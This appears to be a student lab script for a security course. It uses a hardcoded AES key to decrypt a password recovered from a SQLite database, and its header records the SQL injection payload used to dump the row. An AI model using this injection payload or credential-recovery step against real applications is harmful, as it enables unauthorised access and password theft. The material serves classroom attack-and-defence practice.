#!/usr/bin/env python3
"""
Script used to decrypt recovered password from SQLi Attack
ISSEM - Lab 3 - Group 2 - Fall 2026

Payload used for SQLi: a' or 'b'='b
SQLite data retrieved: :101:b'0123456789abcdef\xd7\xfa]\x82\xa1\xdf\x98\x9bu/\x06\x8d+vS\x7f\xddl\x02I\xe6\xb4\x80\xde\xbbw\xef\x10Q\xbbR\xe5\xb7\x9eqHq\xaf}\xf8':!Q#E%T&U8i6y4r2w

Install requirements from lab3:
pip install -r requirements.txt
Then execute:
python3 decrypt.py
"""

from Crypto.Cipher import AES

def decrypt_password(enc_pass_data):
    # docs: https://pycryptodome-master.readthedocs.io/en/latest/src/cipher/aes.html#aes
    key = bytearray(b'\x93n\x12\xcbC\xe0|\xd0\xa6%7(?KW\xa9\xc2\x02\x97\xc6\\\xd6\xd9c\xf4x\xb9\xe2\x89\x88<\x9d')
    nonce = enc_pass_data[:16] # nonce we know is 16 bytes b'0123456789abcdef'
    tag = enc_pass_data[16:32] # mac_len is 16 bytes by default, see docs
    ciphertext = enc_pass_data[32:] # rest is ciphertext
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce) # decrypt using known key from encrypt_password
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def main():
    print(f'[+] decrypt.py for ISSEM - Lab 3 - Group 2 - Fall 2026')
    encrypted_password = b'0123456789abcdef\xd7\xfa]\x82\xa1\xdf\x98\x9bu/\x06\x8d+vS\x7f\xddl\x02I\xe6\xb4\x80\xde\xbbw\xef\x10Q\xbbR\xe5\xb7\x9eqHq\xaf}\xf8'
    print(f'[+] Decrypting recovered password: {encrypted_password}')
    decrypted_password = decrypt_password(encrypted_password)
    print(f'[+] Password: {decrypted_password}')

if __name__ == '__main__':
    main()
